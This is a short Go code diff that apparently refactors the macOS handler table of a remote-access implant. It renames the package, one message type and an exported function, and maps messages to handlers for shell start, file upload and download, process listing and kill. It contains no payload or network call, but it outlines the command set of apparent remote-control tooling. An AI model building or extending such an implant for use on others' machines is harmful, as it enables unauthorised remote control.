@@ -1,4 +1,4 @@
-package main
+package handlers
 
 import (
 	// {{if .Debug}}
@@ -19,7 +19,7 @@ var (
 		pb.MsgPsListReq:   psHandler,
 		pb.MsgPing:        pingHandler,
 		pb.MsgKill:        killHandler,
-		pb.MsgDirListReq:  dirListHandler,
+		pb.MsgLsReq:       dirListHandler,
 		pb.MsgDownloadReq: downloadHandler,
 		pb.MsgUploadReq:   uploadHandler,
 		pb.MsgCdReq:       cdHandler,
@@ -27,12 +27,11 @@ var (
 		pb.MsgRmReq:       rmHandler,
 		pb.MsgMkdirReq:    mkdirHandler,
 
-		pb.MsgShellReq:  startShellHandler,
-		pb.MsgShellData: shellDataHandler,
+		pb.MsgShellReq: startShellHandler,
 	}
 )
 
-func getSystemHandlers() map[uint32]RPCHandler {
+func GetSystemHandlers() map[uint32]RPCHandler {
 	return darwinHandlers
 }
 
